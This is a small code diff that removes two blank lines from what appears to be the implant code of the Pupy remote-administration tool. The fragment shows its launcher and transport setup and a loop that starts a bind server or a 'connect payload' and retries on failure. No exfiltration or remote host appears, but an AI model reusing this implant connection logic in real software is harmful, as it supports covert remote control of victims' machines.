@@ -173,7 +173,6 @@ def main():
             pupy.infos['launcher_inst']=launcher
             pupy.infos['transport']=launcher.get_transport()
             rpyc_loop(launcher)
-
         finally:
             time.sleep(get_next_wait(attempt))
             attempt+=1
@@ -187,7 +186,6 @@ def rpyc_loop(launcher):
                     server_class, port, address, authenticator, stream, transport, transport_kwargs = ret
                     s=server_class(BindSlaveService, port=port, hostname=address, authenticator=authenticator, stream=stream, transport=transport, transport_kwargs=transport_kwargs)
                     s.start()
-
                 else: # connect payload
                     stream=ret
                     def check_timeout(event, cb, timeout=10):
